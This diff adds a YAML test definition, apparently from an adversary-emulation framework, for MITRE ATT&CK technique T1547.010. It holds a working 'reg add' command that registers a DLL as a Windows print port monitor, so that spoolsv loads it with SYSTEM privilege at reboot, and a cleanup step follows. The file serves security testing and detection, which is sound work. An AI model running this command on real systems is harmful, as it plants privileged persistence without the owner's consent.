@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Add Port Monitor persistence in Registry
+description: Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.
+args:
+    - name: monitor_dll
+      type: path
+      default: $PathToAtomicsFolder\T1547.010\bin\PortMonitor.dll
+uuid: d34ef297-f178-4462-871e-9ce618d44e50
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1547: Boot or Logon Autostart Execution'
+    subtechniques:
+        - 'T1547.010: Port Monitors'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: add-port-monitor-persistence-in-registry
+      inline: |
+        reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /v "Driver" /d "{{.Args.monitor_dll}}" /t REG_SZ /f
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /f >nul 2>&1
+        executor: command_prompt
